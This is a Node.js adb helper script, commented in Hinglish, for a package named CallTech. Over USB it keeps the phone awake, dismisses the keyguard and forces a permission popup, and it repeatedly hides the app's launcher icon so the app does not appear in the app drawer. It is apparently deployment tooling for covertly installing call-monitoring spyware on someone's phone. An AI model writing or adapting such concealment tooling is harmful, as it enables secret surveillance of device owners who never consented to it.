/**
 * Install ke baad: icon turant hide, phir USB se permission popup.
 * Launcher alias kabhi enable mat karo — ColorOS drawer mein CallTech dikh jaata hai.
 */
const {execSync} = require('child_process');
const {ensurePackageForAllUsers} = require('./package-check');
const {hideLauncherOnly, disableAliases} = require('./hide-launcher-icon');

const PACKAGE = 'com.calltech';
const ACTIVITY = `${PACKAGE}/.PermissionTrampolineActivity`;

function run(command) {
  try {
    execSync(command, {stdio: 'pipe', encoding: 'utf8'});
    return true;
  } catch (_error) {
    return false;
  }
}

function startOutput(command) {
  try {
    return execSync(command, {encoding: 'utf8', timeout: 15000, stdio: ['pipe', 'pipe', 'pipe']});
  } catch (error) {
    return `${error.stdout || ''}${error.stderr || ''}`;
  }
}

function sleepMs(ms) {
  const seconds = Math.max(1, Math.ceil(ms / 1000) + 1);
  try {
    execSync(`ping -n ${seconds} 127.0.0.1 > nul`, {stdio: 'ignore'});
  } catch (_error) {
    // ignore
  }
}

function hideLauncherIcon(deviceId) {
  hideLauncherOnly(deviceId);
}

function disableIconOnly(deviceId) {
  disableAliases(deviceId);
}

function launchSucceeded(output) {
  const text = String(output || '').toLowerCase();
  return (
    text.includes('status: ok') ||
    text.includes('launchstate:') ||
    (text.includes('starting: intent') && !text.includes('error type') && !text.includes('does not exist'))
  );
}

function startTrampoline(deviceId) {
  const starts = [
    `adb -s ${deviceId} shell am start -W --user 0 -n ${ACTIVITY} -a android.intent.action.MAIN -c android.intent.category.DEFAULT -f 0x10000000 --ez calltech_force_popup true`,
    `adb -s ${deviceId} shell am start -W --user 0 -n ${ACTIVITY} -f 0x10000000 --ez calltech_force_popup true`,
    `adb -s ${deviceId} shell am start --user 0 -n ${PACKAGE}/${PACKAGE}.PermissionTrampolineActivity -f 0x10000000`,
  ];
  return starts.some(cmd => launchSucceeded(startOutput(cmd)));
}

function launchPermissionPopup(deviceId) {
  ensurePackageForAllUsers(deviceId, PACKAGE);
  hideLauncherIcon(deviceId);

  run(`adb -s ${deviceId} shell svc power stayon usb`);
  run(`adb -s ${deviceId} shell input keyevent KEYCODE_WAKEUP`);
  run(`adb -s ${deviceId} shell wm dismiss-keyguard`);
  run(`adb -s ${deviceId} shell input keyevent 82`);
  run(`adb -s ${deviceId} shell pm enable --user 0 ${PACKAGE}/.PermissionTrampolineActivity`);

  sleepMs(400);
  disableIconOnly(deviceId);

  let shown = false;
  for (let i = 0; i < 8 && !shown; i += 1) {
    shown = startTrampoline(deviceId);
    disableIconOnly(deviceId);
    if (!shown) {
      sleepMs(400);
    }
  }

  console.log(
    shown
      ? '  Icon hide + permission popup. Allow dabao — CallTech drawer mein nahi dikhegi.'
      : '  Popup start fail — Developer options: USB debugging (Security settings) ON.',
  );

  return shown;
}

module.exports = {
  PACKAGE,
  ACTIVITY,
  launchPermissionPopup,
  hideLauncherIcon,
};
